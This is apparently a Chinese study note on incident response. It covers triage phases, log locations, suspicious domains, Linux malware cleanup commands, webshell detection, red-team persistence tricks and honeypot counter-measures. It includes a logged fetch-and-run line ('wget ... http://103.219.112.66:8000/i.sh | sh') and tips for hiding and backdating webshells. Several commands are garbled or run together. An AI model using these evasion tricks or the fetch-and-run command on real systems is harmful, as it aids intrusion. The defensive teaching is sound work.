<p>本阶段主要任务是通过事件分析查明事件危害的方式，并且给出清除危害的解决方案。个人认为可以从以下几个方面入手：系统基本信息、网络排查、进程排查、注册表排查、计划任务排查、服务排查、关键目录排查、用户组排查、事件日志排查、webshell排查、中间件日志排查、安全设备日志排查等。</p>
<h5 id="恢复阶段">恢复阶段<a hidden class="anchor" aria-hidden="true" href="#恢复阶段">#</a></h5>
<p>恢复系统的运行过程，就是把受影响系统、设备、软件和应用服务还原到正常的工作状态；系统恢复、网络恢复、用户恢复、数据恢复以及重新部署。常见手段：系统重装、补丁加固、网络恢复、密码重置、木马清除等。</p>
<h5 id="跟踪阶段">跟踪阶段<a hidden class="anchor" aria-hidden="true" href="#跟踪阶段">#</a></h5>
<p>在业务系统恢复后，需要整理一份详细的事件总结报告，包括事件发生及各部门介入处理的时间线，事件可能造成的损失，为客户提供安全加固优化建议。</p>
<p>跟踪阶段主要包括：调查事件原因，输出应急响应报告，提供安全建议、加强安全教育、避免同类事件再次发生。</p>
<h4 id="常规流程">常规流程<a hidden class="anchor" aria-hidden="true" href="#常规流程">#</a></h4>
<p>**收集信息：**收集客户信息和中毒主机信息，包括样本。</p>
<p>**判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。</p>
<p>**深入分析：**日志分析、进程分析、启动项分析、样本分析。</p>
<p>**清理处置：**直接杀掉进程，删除文件，打补丁，抑或是修复文件。</p>
<p>**产出报告：**整理并输出完整的安全事件报告。</p>
<h4 id="系统日志及日志分析">系统日志及日志分析<a hidden class="anchor" aria-hidden="true" href="#系统日志及日志分析">#</a></h4>
<h4 id="日志类型">日志类型<a hidden class="anchor" aria-hidden="true" href="#日志类型">#</a></h4>
<blockquote>
<p>**Windows系统日志：**Windows系统自带的审计日志、操作日志、故障日志。</p>
<p>**Linux系统日志：**Linux系统自带的审计日志、操作日志、故障日志。</p>
<p>**应用日志：**包括但不限于Web应用等众多繁杂的日志。</p>
</blockquote>
<p><strong>Windows系统日志</strong></p>
<blockquote>
<p>日志路径：C:\Windows\System32\winevt\Logs</p>
<p>必看日志：Security.evtx、System.evtx、Application.evtx</p>
</blockquote>
<p><strong>Linux系统日志</strong></p>
<blockquote>
<p>日志路径：/var/log</p>
<p>必看日志：secure、history</p>
</blockquote>
<p><img loading="lazy" src="%E7%AE%80%E5%8E%86&amp;%E9%9D%A2%E8%AF%95.assets/1545730557_5c21f9fd6c014.png" alt="img"  />
</p>
<h4 id="威胁情报的作用">威胁情报的作用<a hidden class="anchor" aria-hidden="true" href="#威胁情报的作用">#</a></h4>
<p>威胁情报有时候会给我们提供大量有用的信息，甚至直接推动了安全事件的快速响应。</p>
<p>威胁情报的元素，包括但不限于域名、URL、IP、文件Hash、文件路径、文件名、数字签名、备案信息、排名信息。</p>
<h4 id="域名">域名<a hidden class="anchor" aria-hidden="true" href="#域名">#</a></h4>
<p>威胁情报中，域名扮演着极为基础和关键的角色，URL也是以域名为基础的。这里列举若干类域名，是属于黑客常用（偏爱）的域名，取证过程中需要重点关注这类域名的信息。</p>
<h5 id="随机域名dga">随机域名（DGA）：<a hidden class="anchor" aria-hidden="true" href="#随机域名dga">#</a></h5>
<h5 id="动态域名">动态域名：<a hidden class="anchor" aria-hidden="true" href="#动态域名">#</a></h5>
<p>动态域名是子域名开放给其他人使用，并且子域名绑定的IP是可以动态获取的，大多数是免费的，因此常被黑客所使用，如 abc.3322.org （3322.org就是动态域名提供者，子域名abc.3322.org可以被别人所使用）。</p>
<h5 id="近期域名">近期域名：<a hidden class="anchor" aria-hidden="true" href="#近期域名">#</a></h5>
<p>域名都是有创建时间（注册时间）的，Alexa全球排名百万之内的域名，都是很早之前就注册了的，从几年到十几、二十几年不等。黑客攻击要逃避防火墙的封堵，极可能在实施的时候，再去注册一个域名</p>
<h5 id="暗网代理域名">暗网代理域名：<a hidden class="anchor" aria-hidden="true" href="#暗网代理域名">#</a></h5>
<p>暗网，也叫Tor网络，此网络的访问、传输流量是不可追踪溯源的，因此是黑色产业链的温床。要访问暗网，要么病毒自己实现Tor客户端，要么通过Tor代理来访问Tor网络，而通过Tor代理访问的流量是未加密的，其直接使用Tor代理访问Tor站点服务器。</p>
<p>因此，暗网代理域名是可以被检测到的。</p>
<p>例如访问https://abbujjh5vqtq77wg.onion.link/由于二级域名onion.link属于Tor代理域名，所以认定此次访问行为是Tor网络访问行为，且为非法访问可能性极高。</p>
<h5 id="顶级域名">顶级域名：<a hidden class="anchor" aria-hidden="true" href="#顶级域名">#</a></h5>
<p>不是所有的顶级域名都需要特别关注，要从客户业务出发，去反推客户主机为何要访问相关的顶级域名。也就是说，这里面有一批顶级域名，实际客户业务是不需要去访问的，那么剩下的就只有黑客行为了</p>
<p>就是这样一批顶级域名（包括但不限于以下顶级域名）：</p>
<table>
<thead>
<tr>
<th style="text-align:center">顶级域名</th>
<th style="text-align:center">申请地区或机构</th>
<th style="text-align:center">为何重点关注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.ru</td>
<td style="text-align:center">俄罗斯</td>
<td style="text-align:center">俄罗斯盛产黑客</td>
</tr>
<tr>
<td style="text-align:center">.ws</td>
<td style="text-align:center"><a href="https://baike.baidu.com/item/%E4%B8%9C%E8%90%A8%E6%91%A9%E4%BA%9A">东萨摩亚</a></td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
<tr>
<td style="text-align:center">.cc</td>
<td style="text-align:center"><a href="https://baike.baidu.com/item/%E7%A7%91%E7%A7%91%E6%96%AF%E7%BE%A4%E5%B2%9B">科科斯群岛</a></td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
<tr>
<td style="text-align:center">.pw</td>
<td style="text-align:center">帕劳</td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
<tr>
<td style="text-align:center">.bz</td>
<td style="text-align:center"><a href="https://baike.baidu.com/item/%E4%BC%AF%E5%88%A9%E5%85%B9">伯利兹</a></td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
<tr>
<td style="text-align:center">.su</td>
<td style="text-align:center">苏联</td>
<td style="text-align:center">前苏联虽然解体了，顶级域名还在使用，且多与黑产有关</td>
</tr>
<tr>
<td style="text-align:center">.bw</td>
<td style="text-align:center">伯兹瓦纳</td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
<tr>
<td style="text-align:center">.gw</td>
<td style="text-align:center"><a href="https://baike.baidu.com/item/%E5%87%A0%E5%86%85%E4%BA%9A%E6%AF%94%E7%BB%8D">几内亚比绍</a></td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
<tr>
<td style="text-align:center">.ms</td>
<td style="text-align:center"><a href="https://baike.baidu.com/item/%E8%92%99%E5%A1%9E%E6%8B%89%E7%89%B9%E5%B2%9B">蒙塞拉特岛</a></td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
<tr>
<td style="text-align:center">.mz</td>
<td style="text-align:center"><a href="https://baike.baidu.com/item/%E8%8E%AB%E6%A1%91%E6%AF%94%E5%85%8B">莫桑比克</a></td>
<td style="text-align:center">不知名国家，易申请，难追踪注册者</td>
</tr>
</tbody>
</table>
<p>这里举个例子，我们在某台告警主机上，使用Wireshark抓网络网络，直接过滤DNS协议如下：</p>
<p><img loading="lazy" src="https://www.kro1lsec.com:442/images/2021/05/28/20210528162226.jpg" alt="应急响应的整体思路和基本流程"  />
</p>
<p>可以看到，此主机解析了大量.pw站点的域名，如koqqveoukgjc.pw，.pw是帕劳国家顶级域名，此国家是一个非常小的岛国，跟中国大陆都没有建交，国内企业有需要访问他们站点的可能性低到零（或者有业务在帕劳的可能性）</p>
<h4 id="常见病毒及分类">常见病毒及分类<a hidden class="anchor" aria-hidden="true" href="#常见病毒及分类">#</a></h4>
<p>勒索病毒：能对用户文件进行加密的病毒。</p>
<p><img loading="lazy" src="https://www.kro1lsec.com:442/images/2021/05/28/20210528162229.jpg" alt="应急响应的整体思路和基本流程"  />
</p>
<p>挖矿病毒：消耗用户CPU、GPU资源，进行大量运算，获取加密货币的病毒。</p>
<blockquote>
<p>**蠕虫：**自动复制自身的副本到其它主机的病毒。</p>
<p>**木马：**隐蔽性强，多用于监控用户行为或盗取用户数据的病毒。</p>
<p>**感染型病毒：**能将自身恶意代码插入正常文件的病毒。</p>
<p>**脚本病毒：**使用脚本编写的病毒。</p>
<p>**宏病毒：**宏是微软公司为其Office软件包设计的一个特殊功能，由于其功能强大，使得黑客可以通过精心构造的宏代码来实现恶意操作，这些代码就叫做宏病毒。宏病毒常以垃圾邮件的方式对用户进行攻击，因为伪造的Office文档不容易引起用户的怀疑，所以当用户毫无防备的打开Office文档并启用宏之后，宏病毒便开始了运行，对用户主机进行恶意操作。</p>
<p>**僵尸网络病毒：**能形成大型的一对多，多对多控制的远程控制病毒。</p>
<p>**后门：**在主机上开放端口允许远程非授权访问。</p>
</blockquote>
<h4 id="漏洞和补丁">漏洞和补丁<a hidden class="anchor" aria-hidden="true" href="#漏洞和补丁">#</a></h4>
<p>漏洞和补丁，在应急响应中是不可或缺。如果黑客是通过某种漏洞入侵系统的，而在应急响应中，无法找出黑客所利用的漏洞，就会意味着，入侵行为可以反复发生。在终端侧，就会表现为病毒清理不干净，杀了又来，所以一定要找出漏洞。</p>
<p>找到漏洞后，就需要打上相应的补丁，这样才是一次完整的处置。</p>
<p>查看系统补丁情况：</p>
<p>Windows：直接打开cmd，输入命令systeminfo即可获取。</p>
<blockquote>
<p>**漏洞是什么：**漏洞是指一个系统存在的弱点或缺陷。</p>
<p>**怎么来的：**系统设计时的缺陷或编码时产生的错误。</p>
<p>**有什么后果：**黑客的侵入及病毒的驻留，数据丢失和篡改、隐私泄露，系统被控制并作为入侵其他主机系统的跳板，等等。</p>
<p>**解决方法：**打补丁。</p>
</blockquote>
<h2 id="工具">工具<a hidden class="anchor" aria-hidden="true" href="#工具">#</a></h2>
<p>红蓝对抗安全工具汇总https://blog.csdn.net/littleliuing/article/details/109745934</p>
<p>**流量分析工具：**常用的流量分析工具是Wireshark、TCPView，也可以使用科来网络分析工具，Linux下对tcpdump比较熟悉的，也可以使用tcpdump。</p>
<p>**进程分析工具：**能对进程相关联信息进行分析的工具，主要是ProcessHacker和PC Hunter等。</p>
<p>**启动项分析工具：**主要是AutoRuns工具，便于定位病毒启动项。</p>
<p>**专杀工具：**有些流行病毒家族，通常对杀软有抑制性，或者本身有感染性，需要专杀工具去查杀和修复正常文件。</p>
<p>**辅助工具：**WinHex、文件Hash工具、Everything搜索工具、Unlocker文件解锁工具等。</p>
<p>**内存扫描工具：**主要是MemScanner</p>
<p>应急响应脚本:1997CN/Emergency</p>
<pre><code>https://github.com/1997CN/Emergency
</code></pre><p>Linux主机排查:grayddq/GScan</p>
<pre><code>https://github.com/grayddq/GScan
</code></pre><p>linux安全检查:T0xst/linux</p>
<pre><code>https://github.com/T0xst/linux
</code></pre><p>linux信息收集/应急响应/常见后门检测脚本:al0ne/LinuxCheck</p>
<pre><code>https://github.com/al0ne/LinuxCheck
</code></pre><h4 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h4>
<p>(“Network Mapper(网络映射器)”)网络探测和安全审核的工具。</p>
<p>主机提供什么服务(应用程序名和版本)，</p>
<p>那些服务运行在什么操作系统(包括版本信息)，</p>
<p>它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。</p>
<h4 id="msf">MSF<a hidden class="anchor" aria-hidden="true" href="#msf">#</a></h4>
<p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数2000多个已知软件漏洞的专业级漏洞攻击工具。</p>
<h2 id="windows应急响应">Windows应急响应<a hidden class="anchor" aria-hidden="true" href="#windows应急响应">#</a></h2>
<pre><code>https://www.freebuf.com/articles/es/210315.html
https://www.freebuf.com/articles/network/203494.html
</code></pre><h4 id="服务流程"><strong>服务流程</strong><a hidden class="anchor" aria-hidden="true" href="#服务流程">#</a></h4>
<h5 id="沟通确认安全事件"><strong>沟通确认安全事件</strong><a hidden class="anchor" aria-hidden="true" href="#沟通确认安全事件">#</a></h5>
<p>在与客户第一次沟通时，应及时提醒客户对受害机器及时进行断网隔离操作。已知的安全事件包括但不限于如下：</p>
<blockquote>
<p>\1. 恶意代码威胁，即僵尸网络、恶意木马、蠕虫病毒、勒索病毒等恶意代码导致的安全事件</p>
<p>\2. 高级持续性威胁(APT)攻击事件，即具有潜伏性、隐蔽性、目的性、持续性等特点的安全事件</p>
<p>\3. 非法入侵事件，包括但不限于业务系统受到入侵致使数据泄露、丢失等；外网网站被入侵，导致网站被恶意篡改植入暗链或出现其他非法的宣传标语；服务器被入侵导致受到勒索攻击等安全事件</p>
<p>\4. 漏洞事件，即0day公布；在野漏洞发现；已知漏洞被发现受到通报等安全事件</p>
<p>\5. 数据泄露事件，即重要数据因受到了入侵导致的泄露；应用配置不当导致的泄露；员工误操作导致的泄露；内鬼泄露等安全事件</p>
<p>\6. 分布式拒绝服务攻击（DDOS）事件，即网站受到了各类DOS攻击，包括但不限于CC攻击、洪水攻击、流量放大攻击等安全事件</p>
<p>\7. 流量劫持，DNS劫持、HTTP劫持</p>
<p>\8. 其他归于网络安全的事件</p>
</blockquote>
<p>注意事项：一定要亲自确认，切不可盲目相信他人所述。</p>
<h6 id="排查角度">排查角度<a hidden class="anchor" aria-hidden="true" href="#排查角度">#</a></h6>
<blockquote>
<ol>
<li>
<p>是否有异常进程、用户</p>
</li>
<li>
<p>敏感端口开放情况</p>
</li>
<li>
<p>密码强度</p>
</li>
<li>
<p>日志分析</p>
</li>
</ol>
<p>5)异常启动项、服务、计划任务</p>
<ol start="6">
<li>
<p>注册表信息</p>
</li>
<li>
<p>其它</p>
</li>
</ol>
</blockquote>
<p>确认后，应尽量收集与本次安全事件相关的信息，例如什麽时候发现的攻击，之前有无出现过安全事件等。</p>
<p>在确认安全事件后明确应急目的：</p>
<blockquote>
<p>\1. 病毒、后门清除工作</p>
<p>\2. 协助业务系统安全的恢复上线</p>
<p>\3. 攻击溯源工作。（仅溯源至攻击者的攻击切入点）</p>
</blockquote>
<h5 id="现场保护"><strong>现场保护</strong><a hidden class="anchor" aria-hidden="true" href="#现场保护">#</a></h5>
<p>在与客户沟通时，应提醒客户注意保护现场，千万不要直接重装系统，以方便后续的溯源工作及可能存在的电子取证工作。在处置受害机器时，应尽量保持受害机器的原样，如虚拟机处置时，可以让客户进行快照存储。</p>
<h5 id="了解客户网络状况"><strong>了解客户网络状况</strong><a hidden class="anchor" aria-hidden="true" href="#了解客户网络状况">#</a></h5>
<p>对客户的网络拓扑应尽早进行了解，特别是网络的进出口、负载均衡、防火墙、DNS服务器。</p>
<h5 id="确定事件影响"><strong>确定事件影响</strong><a hidden class="anchor" aria-hidden="true" href="#确定事件影响">#</a></h5>
<p><strong>确定工作方向</strong></p>
<p><strong>确立工作目标</strong></p>
<p><strong>明确现场工作任务归属</strong></p>
<p>无论现场的环境，主导本次安全事件，合理分配现场工作为应急人员的必备技能。</p>
<p>对现场的可能存在的工作应具备清晰的认知。通常会存在以下工作内容：病毒分析处置、业务恢复、安全加固、溯源分析、临时需求处置、产品对接与使用、应急指挥与协调。</p>
<h2 id="linux应急响应">Linux应急响应<a hidden class="anchor" aria-hidden="true" href="#linux应急响应">#</a></h2>
<pre><code>https://www.freebuf.com/articles/system/218407.html
</code></pre><h3 id="概述">概述<a hidden class="anchor" aria-hidden="true" href="#概述">#</a></h3>
<p><strong>Linux环境下处理应急响应事件往往会更加的棘手，因为相比于Windows，Linux没有像Autorun、procexp这样的应急响应利器，也没有统一的应急响应处理流程。所以，这篇文章将会对Linux环境下的应急响应流程进行讲解，并且提供每一个环节中所用到的shell命令，以帮助大家快速、系统化地处理Linux环境下的病毒。</strong></p>
<p>Linux平台下的恶意软件威胁以僵尸网络蠕虫和挖矿病毒为主，由于Linux大多作为服务器暴露在公网，且Web应用的漏洞层出不穷，所以很容易被大范围入侵，如常见的病毒：DDG、systemdMiner、BillGates、watchdogs、XorDDos，在很多Linux上都有。大家要养成不使用弱密码、勤打补丁的好习惯。</p>
<p>处理Linux应急响应主要分为这4个环节:识别现象-&gt; 清除病毒-&gt; 闭环兜底-&gt; 系统加固。</p>
<p>首先从用户场景的主机异常现象出发，先识别出病毒的可疑现象。</p>
<p>然后定位到具体的病毒进程以及病毒文件，进行清除。</p>
<p>完成前2步还不够，病毒一般会通过一些自启动项及守护程序进行重复感染，所以我们要执行闭环兜底确保病毒不再被创建。</p>
<p>将主机上的病毒项清除干净后，最后就是进行系统加固了，防止病毒从Web再次入侵进来。</p>
<p>走完这4个环节，才能算是一个应急响应流程的结束。</p>
<p><img loading="lazy" src="https://www.kro1lsec.com:442/images/2021/05/28/20210528162239.jpg" alt="img"  />
</p>
<h3 id="识别现象">识别现象<a hidden class="anchor" aria-hidden="true" href="#识别现象">#</a></h3>
<p>第1个环节要求我们通过系统运行状态、安全设备告警，发现主机异常现象，以及确认病毒的可疑行为。</p>
<p>系统CPU是否异常</p>
<p>枚举进程，CPU降序排序：top</p>
<p>CPU占用率超过70%且名字比较可疑的进程，大概率就是挖矿病毒了。</p>
<p><img loading="lazy" src="https://image.3001.net/images/20191030/1572397595_5db8e21bc86f4.png!small" alt="img"  />
</p>
<p>是否存在可疑进程</p>
<p>枚举进程命令行：ps -aux</p>
<p>病毒一般都携带可疑的命令行，当你发现命令行中带有url等奇怪的字符串时，就要注意了，它很可能是个病毒downloader。</p>
<h4 id="安全网关有无报警">安全网关有无报警<a hidden class="anchor" aria-hidden="true" href="#安全网关有无报警">#</a></h4>
<p>从安全网关报警中识别出威胁是最直接，但确认主机已经感染了病毒只是第一步，接下来得定位，具体是哪个进程在与C&amp;C通信。</p>
<p><img loading="lazy" src="https://image.3001.net/images/20191030/1572397697_5db8e2811a9a1.png!small" alt="img"  />
</p>
<p>监控与目标IP通信的进程：</p>
<p>while true; do netstat -antp | grep [ip]; done</p>
<p><img loading="lazy" src="https://image.3001.net/images/20191030/1572397761_5db8e2c1de346.png!small" alt="img"  />
</p>
<p>有时安全网关检测到的不全是恶意IP，还有可能是个域名，这种情况下，域名对应的IP是变化的，我们不能直接用上述方法进行监控。</p>
<p>我们可以先在host文件中添加一条规则，将恶意域名重定向到一个随机的IP地址，然后对其进行监控。</p>
<p>这样就能得到与之通信的恶意进程了。</p>
<h4 id="有无可疑历史命令">有无可疑历史命令<a hidden class="anchor" aria-hidden="true" href="#有无可疑历史命令">#</a></h4>
<p>遍历主机历史命令，查找有无恶意命令：history</p>
<h3 id="清除病毒">清除病毒<a hidden class="anchor" aria-hidden="true" href="#清除病毒">#</a></h3>
<p>从第1个环节追溯到的进程信息，将会帮助我们定位到病毒进程&amp;病毒文件，实现清除。</p>
<h4 id="结束病毒进程">结束病毒进程<a hidden class="anchor" aria-hidden="true" href="#结束病毒进程">#</a></h4>
<p>清除可疑进程的进程链：</p>
<pre><code>ps -elf | grep [pid] kill -9 [pid]
</code></pre><p><img loading="lazy" src="https://image.3001.net/images/20191030/1572397962_5db8e38ae8d29.png!small" alt="img"  />
</p>
<h4 id="删除病毒文件">删除病毒文件<a hidden class="anchor" aria-hidden="true" href="#删除病毒文件">#</a></h4>
<p>定位病毒进程对应的文件路径：</p>
<pre><code>ls -al /proc/[pid]/exe rm -f [exe_path]
</code></pre><p><img loading="lazy" src="https://image.3001.net/images/20191030/1572398282_5db8e4ca34628.png!small" alt="img"  />
</p>
<h3 id="闭环兜底">闭环兜底<a hidden class="anchor" aria-hidden="true" href="#闭环兜底">#</a></h3>
<p>Linux下的病毒持久化驻留方式相比于Windows较少，主要以下4种方式。</p>
<h4 id="检查是否存在可疑定时任务">检查是否存在可疑定时任务<a hidden class="anchor" aria-hidden="true" href="#检查是否存在可疑定时任务">#</a></h4>
<p>枚举定时任务：crontab-l</p>
<p><img loading="lazy" src="https://image.3001.net/images/20191030/1572398496_5db8e5a0d985e.png!small" alt="img"  />
</p>
<p>查看anacron异步定时任务：cat/etc/anacrontab</p>
<p><img loading="lazy" src="https://image.3001.net/images/20191030/1572398519_5db8e5b7b440c.png!small" alt="img"  />
</p>
<h4 id="检查是否存在可疑服务">检查是否存在可疑服务<a hidden class="anchor" aria-hidden="true" href="#检查是否存在可疑服务">#</a></h4>
<p>枚举主机所有服务，查看是否有恶意服务：</p>
<pre><code>service--status-all
</code></pre><p>检查系统文件是否被劫持</p>
<p>枚举系统文件夹的文件，按修改事件排序查看7天内被修改过的文件：</p>
<pre><code>find /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ -type f -mtime +7 | xargs ls -la
</code></pre><p>检查是否存在病毒守护进程</p>
<p>监控守护进程的行为：lsof-p[pid]</p>
<p><img loading="lazy" src="https://image.3001.net/images/20191030/1572398848_5db8e7004b8b2.png!small" alt="img"  />
</p>
<pre><code>strace-tt-T -etrace=all-p$pid
</code></pre><h4 id="扫描是否存在恶意驱动">扫描是否存在恶意驱动<a hidden class="anchor" aria-hidden="true" href="#扫描是否存在恶意驱动">#</a></h4>
<p>枚举/扫描系统驱动：lsmod</p>
<p>安装chkrootkit进行扫描：</p>
<pre><code>wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense./chkrootkit
</code></pre><p>安装rkhunter进行扫描：</p>
<pre><code>Wgethttps://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvf rkhunter-1.4.4.tar.gzcd rkhunter-1.4.4./installer.sh --installrkhunter -c
</code></pre><p>最后一个环节往往是大家比较容易遗忘的，Linux平台下90%的病毒是通过网络传播感染的，所以，你的主机之所以会感染病毒，大部分原因也是因为Web安全防护不够，赶紧检查一下。</p>
<p>修改SSH弱密码</p>
<p>查询log主机登陆日志：</p>
<pre><code>grep &quot;Accepted &quot; /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'
</code></pre><p>定位有爆破的源IP：</p>
<pre><code>grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c
</code></pre><p>爆破日志的用户名密码：</p>
<pre><code>grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}'|uniq -c|sort -nr
</code></pre><p>SSH爆破是Linux病毒最常用的传播手段，若存在弱密码的主机很容易被其他感染主机SSH爆破成功，从而再次感染病毒。</p>
<h4 id="添加命令审计">添加命令审计<a hidden class="anchor" aria-hidden="true" href="#添加命令审计">#</a></h4>
<p>为历史的命令增加登录的IP地址、执行命令时间等信息：</p>
<p><strong>[1]保存1万条命令：</strong></p>
<pre><code>sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile
</code></pre><p><strong>[2]在/etc/profile的文件尾部添加如下行数配置信息：</strong></p>
<pre><code>USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fi export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;  shopt -s histappend  export PROMPT_COMMAND=&quot;history -a&quot;
</code></pre><p><strong>[3]让配置生效：</strong></p>
<pre><code>source /etc/profile
</code></pre><p>生成效果：</p>
<pre><code>762019-10-2817:05:34113.110.229.230 wget -q -T180 -O-http://103.219.112.66:8000/i.sh) | sh
</code></pre><h4 id="打上常见web漏洞补丁">打上常见Web漏洞补丁<a hidden class="anchor" aria-hidden="true" href="#打上常见web漏洞补丁">#</a></h4>
<blockquote>
<p>structs2系列RCE漏洞</p>
<p>thinkphp5.XRCE漏洞</p>
<p>Redis未授权访问漏洞</p>
<p>ConfluenceRCE漏洞（CVE_2019_3396）</p>
<p>DrupalRCE漏洞（CVE-2018-7600）</p>
<p>ThinkPHPRCE漏洞（CVE-2019-9082）</p>
</blockquote>
<h2 id="webshell"><strong>Webshell</strong><a hidden class="anchor" aria-hidden="true" href="#webshell">#</a></h2>
<p>一种恶意脚本，其目的是获得服务器的执行操作权限</p>
<h3 id="检测方式">检测方式<a hidden class="anchor" aria-hidden="true" href="#检测方式">#</a></h3>
<p><strong>静态检测</strong>
匹配文件特征码、特征值、危险函数eval等来查找webshell
依据特征码弱强特征，结合人工判断，可减少漏报误报概率
利用文件系统的属性判断，无缘无故多出的nobody属性文件必定有问题(Apache是nobody启动)</p>
<p>弱点: 漏报误报率较高，无法查杀变种及0day型
<strong>动态监测</strong>
依据webshell文件执行表现的特征即动态特征，如菜刀操作的特征</p>
<p>webshell命令执行时必会创建bash或IIS User启动cmd 由PID进程号定位webshell</p>
<p>http异常模型检测，检测若有有用户访问一个从未访问过的文件并得到200响应，很容易定位webshell</p>
<p>修改内核，hook一些危险函数eval、asset，重新编译php;</p>
<p>弱点:降低php性能及业务性能</p>
<p><strong>日志检测</strong>
webshell访问特征</p>
<ul>
<li>少量ip发起fangwen</li>
<li>总访问次数少</li>
<li>该页面属于孤立页面</li>
</ul>
<h4 id="查杀工具">查杀工具<a hidden class="anchor" aria-hidden="true" href="#查杀工具">#</a></h4>
<p><a href="https://blog.csdn.net/qq_23936389/article/details/105445551">https://blog.csdn.net/qq_23936389/article/details/105445551</a></p>
<p><strong>D盾</strong>  <strong>河马</strong></p>
<h2 id="权限维持">权限维持<a hidden class="anchor" aria-hidden="true" href="#权限维持">#</a></h2>
<h3 id="针对蓝队">针对蓝队<a hidden class="anchor" aria-hidden="true" href="#针对蓝队">#</a></h3>
<p><strong>其他文件夹写入shell</strong>：初次上传路径一般都是存放图片等类型文件的文件夹，如果在这样的文件夹中突然出现一个php后缀的文件，那么十有八九会被发现，所以为了避免被蓝队发现，一般做法是在其他可写的文件夹下写入shell。</p>
<p>**改写shell的日期：**这个主要针对linux平台，因为linux下webshell查杀工具不多，可能会通过命令去查杀。</p>
<p>可能的命令是find命令</p>
<pre><code>find -name &quot;*.php&quot; -type f -mtime -3 -exec ls -l {} \;
</code></pre><p>修改方法是touch命令，比如：</p>
<p>touch -d &lsquo;08-August-2019&rsquo; rrr.php</p>
<p>**写入不死马：**所谓不死马，就是常驻内存的木马，通过循环在某路径下生成shell来维持权限，即使删除了shell,还是会生成。</p>
<p><strong>写入其他后门：</strong>
1.写入命令执行后门</p>
<p>2.图片马结合文件包含脚本：图片马中写入恶意代码，然后在相应位置放置文件包含的漏洞文件，通过访问文件包含漏洞文件去解析图片马，图片马生成shell，然后直接连接。</p>
<h2 id="反制手段">反制手段<a hidden class="anchor" aria-hidden="true" href="#反制手段">#</a></h2>
<p>**现代蜜罐：**除了捕获分析攻击行为外，各类安全厂商在蜜罐产品中加入了“攻击者画像”这一功能作为“卖点”，而本质上攻击者画像是将第三方厂商漏洞转为画像探针，利用第三方厂商漏洞获取攻击者所在此类厂商网站业务上的个人信息，此类漏洞多半为前端类漏洞，例如：JSONP、XSS&hellip;除此之外还有网站伪造、自动投放蜜标等等众多丰富的功能。</p>
<p>所以传统蜜罐厂商在这一块的被“需要”不大，而现代蜜罐厂商在这一块往往有需要性很多，就冲“攻击者画像”这一方面在演习过程中就可以为防守方加分。</p>
<h4 id="蜜罐的反制">蜜罐的反制<a hidden class="anchor" aria-hidden="true" href="#蜜罐的反制">#</a></h4>
<p>现代化蜜罐都做了哪些反制的操作呢？</p>
<ol>
<li>可克隆相关系统页面，伪装“漏洞”系统</li>
<li>互联网端投饵，一般会在Github、Gitee、Coding上投放蜜标（有可能是个单独的网站地址、也有可能是个密码本引诱中招）</li>
<li>利用JSONP、XSS、CSRF等前端类漏洞获取访问蜜标的攻击者网络身份（网络画像）</li>
</ol>
<h4 id="主动攻击攻击ip">主动攻击“攻击IP”<a hidden class="anchor" aria-hidden="true" href="#主动攻击攻击ip">#</a></h4>
<p>防守日常就是看流量、分析流量，其中大部分都为扫描器流量，由于一般扫描器都会部署在VPS上，因此我们可以结合<strong>流量监测平台</strong>反向扫描</p>
<h4 id="溯源反制">溯源反制<a hidden class="anchor" aria-hidden="true" href="#溯源反制">#</a></h4>
<p><a href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p>
<p>1、没有对附件文件进行逆向分析，看是调试信息中包含了物理路径信息。</p>
<p>2、没有利用社工库进一步挖掘到攻击者的真实身份信息</p>
<p>3、报告中缺少对软件行为的细致分析。</p>
<p>4、钓鱼邮件完全可以<strong>将计就计</strong>，建个QQ群骗出对方的木马文件、钓鱼链接。从而进一步进行溯源分析。</p>
<h2 id="0day储备">0day储备<a hidden class="anchor" aria-hidden="true" href="#0day储备">#</a></h2>
<p>对于防守方来说，从行为检测上看，其实0day并没有那么可怕，即使遭遇0day攻击，主机上的对抗也会<strong>回到基本面上</strong>，比如：Webshell、恶意命令、反弹Shell、端口扫描、黑客工具、端口转发、提权、C2通信等等，这里就要求防守方超越IoC和传统黑特征的束缚，<strong>不依赖对特定漏洞利用的先验知识，而全面基于行为数据进行建模，从而拥有发现和识别通过未知漏洞突破的恶意活动检测能力</strong>。对于完善的纵深防御体系来说，抓住端点上的蛛丝马迹，可能在攻击者尝试执行探测命令时就可以告警了，甚至可以用蜜罐捕获0day。攻击队的0day利用也需要深思熟虑，识别绕过蜜罐，并尽量趋向于合法操作，比如添加账号，而不是执行黑命令或者直接反弹Shell。</p>
